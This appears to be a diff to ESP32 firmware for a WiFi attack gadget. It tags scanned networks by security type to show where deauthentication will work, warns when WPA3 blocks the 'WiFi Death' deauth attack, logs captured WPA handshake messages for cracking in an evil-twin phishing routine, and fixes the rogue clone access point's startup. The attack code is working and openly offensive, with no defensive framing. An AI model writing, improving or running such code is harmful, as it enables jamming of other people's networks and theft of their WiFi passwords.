@@ -227,11 +227,12 @@ volatile bool g_oledDirty = true;
 
 // ── WiFi scan results captured for the OLED list view ──────
 struct WifiAP {
-    char    ssid[33];
-    uint8_t bssid[6];
-    uint8_t channel;
-    int8_t  rssi;
-    bool    selected;   // multi-select for kill list
+    char     ssid[33];
+    uint8_t  bssid[6];
+    uint8_t  channel;
+    int8_t   rssi;
+    bool     selected;   // multi-select for kill list
+    uint8_t  auth;       // wifi_auth_mode_t — used to flag PMF likelihood
 };
 #define MAX_APS 30
 WifiAP g_aps[MAX_APS];
@@ -1269,6 +1270,7 @@ static uint16_t buildScanJsonArduino(int count) {
             a.channel  = WiFi.channel(i);
             a.rssi     = WiFi.RSSI(i);
             a.selected = false;
+            a.auth     = (uint8_t)WiFi.encryptionType(i);
             g_apCount++;
         }
     }
@@ -1965,6 +1967,11 @@ static void phishEapolCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
         memcpy(g_hsk.staMac, hdr->dst, 6);
         memcpy(g_hsk.aNonce, &pay[keyOff + 13], 32);
         g_hsk.m1Captured = true;
+        // Diagnostic (not from ISR — logAdd uses Serial.printf which is
+        // safe in ESP-IDF's promiscuous CB context but keep brief)
+        Serial.printf("[Phish] M1 captured AP=%02X%02X..%02X STA=%02X..%02X\n",
+                      g_hsk.apMac[0],g_hsk.apMac[1],g_hsk.apMac[5],
+                      g_hsk.staMac[0],g_hsk.staMac[5]);
         return;
     }
     // M2 — STA → AP, ack=0, MIC=1, secure=0, install=0 → carries SNonce + MIC
@@ -1988,6 +1995,8 @@ static void phishEapolCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
         g_hsk.eapolBodyLen = eapolLen;
         g_hsk.m2Captured   = true;
         g_phish.phase      = 2;                  // CAPT — ready to crack
+        Serial.printf("[Phish] M2 captured! body=%d bytes — crack starts soon\n",
+                      g_hsk.eapolBodyLen);
     }
 }
 
@@ -2101,16 +2110,23 @@ bool startNetPhish(const char* ssid, const uint8_t bssid[6], uint8_t channel) {
     // Dummy WPA-PSK password — random per-run so cached client profiles
     // don't accidentally succeed. We never use this value to verify
     // anything; it just makes ESP32 advertise a WPA2-protected AP.
-    char dummyPw[16];
-    snprintf(dummyPw, sizeof(dummyPw), "REAP_%lu", (unsigned long)(esp_random() & 0xFFFFFFFF));
+    // Format guarantees exactly 13 chars (well above WPA's 8-char floor)
+    // — earlier `%lu` could produce 6-char strings on small random values,
+    // causing softAP() to fail silently.
+    char dummyPw[20];
+    snprintf(dummyPw, sizeof(dummyPw), "REAP_%08lX",
+             (unsigned long)esp_random());
 
     // Bring up clone AP — exact SSID, target channel, WPA2-PSK
     WiFi.disconnect(false, false);
     esp_wifi_set_mode(WIFI_MODE_APSTA);
     vTaskDelay(pdMS_TO_TICKS(150));
     WiFi.softAPConfig(AP_IP, AP_GW, AP_SN);
-    WiFi.softAP(g_phish.ssid, dummyPw, g_phish.channel, 0, 8);
+    bool apOk = WiFi.softAP(g_phish.ssid, dummyPw, g_phish.channel, 0, 8);
     vTaskDelay(pdMS_TO_TICKS(200));
+    logAdd(String("Phish AP: ") + (apOk ? "UP" : "FAIL") +
+           " ssid='" + g_phish.ssid + "' ch=" + String(g_phish.channel) +
+           " dummy=" + String(strlen(dummyPw)) + "chr", "WARN");
 
     // Enable promiscuous capture for EAPOL frames during connection
     // attempts. Filter to DATA frames only (EAPOL rides on data).
@@ -2310,11 +2326,30 @@ static void drawWifiList() {
             // BACK entry
             oled.print("<< Back to menu");
         } else {
-            // AP entry — checkbox (*=selected) + truncated SSID + channel
-            char ssid12[13]; strncpy(ssid12, g_aps[idx].ssid, 12); ssid12[12] = '\0';
+            // AP entry — checkbox (*=selected) + SSID + channel + auth tag.
+            // The auth tag flags PMF likelihood, which determines whether
+            // deauth has any chance of working against the target:
+            //   OPEN/WEP/WPA/WPA2 -> deauth likely works (no/optional PMF)
+            //   WPA3              -> deauth IMPOSSIBLE (PMF required)
+            //   2/3 mixed         -> PMF optional; mileage varies
+            const char* atag = "?";
+            switch ((wifi_auth_mode_t)g_aps[idx].auth) {
+                case WIFI_AUTH_OPEN:           atag = "OPN"; break;
+                case WIFI_AUTH_WEP:            atag = "WEP"; break;
+                case WIFI_AUTH_WPA_PSK:        atag = "WP1"; break;
+                case WIFI_AUTH_WPA2_PSK:       atag = "WP2"; break;
+                case WIFI_AUTH_WPA_WPA2_PSK:   atag = "W12"; break;
+                case WIFI_AUTH_WPA2_ENTERPRISE:atag = "ENT"; break;
+                case WIFI_AUTH_WPA3_PSK:       atag = "WP3"; break;  // PMF req
+                case WIFI_AUTH_WPA2_WPA3_PSK:  atag = "W23"; break;  // PMF opt
+                default: break;
+            }
+            // Shorter SSID slice (10 chars) to make room for the auth tag
+            char ssid10[11]; strncpy(ssid10, g_aps[idx].ssid, 10); ssid10[10] = '\0';
             char line[24];
-            snprintf(line, sizeof(line), "%c %s c%d",
-                     g_aps[idx].selected ? '*' : ' ', ssid12, g_aps[idx].channel);
+            snprintf(line, sizeof(line), "%c %s c%d %s",
+                     g_aps[idx].selected ? '*' : ' ',
+                     ssid10, g_aps[idx].channel, atag);
             oled.print(line);
         }
         oled.setTextColor(WHITE);
@@ -2939,6 +2974,17 @@ static void handleLongPress() {
             case 1:  // WiFi Death — attack selected APs (or broadcast)
                 g_screen = SCR_DEAUTH;
                 if (!g_deauth.active) {
+                    // Pre-flight warning: any selected WPA3 target is going
+                    // to ignore deauth no matter what we do (802.11w PMF).
+                    for (int i = 0; i < g_apCount; i++) {
+                        if (!g_aps[i].selected) continue;
+                        wifi_auth_mode_t am = (wifi_auth_mode_t)g_aps[i].auth;
+                        if (am == WIFI_AUTH_WPA3_PSK ||
+                            am == WIFI_AUTH_WPA2_WPA3_PSK) {
+                            logAdd(String("WARN: '")+g_aps[i].ssid+
+                                   "' uses WPA3 — PMF blocks deauth", "WARN");
+                        }
+                    }
                     int n = startDeauthMulti();
                     if (n == 0) logAdd("Death: no targets — hold=broadcast");
                 }
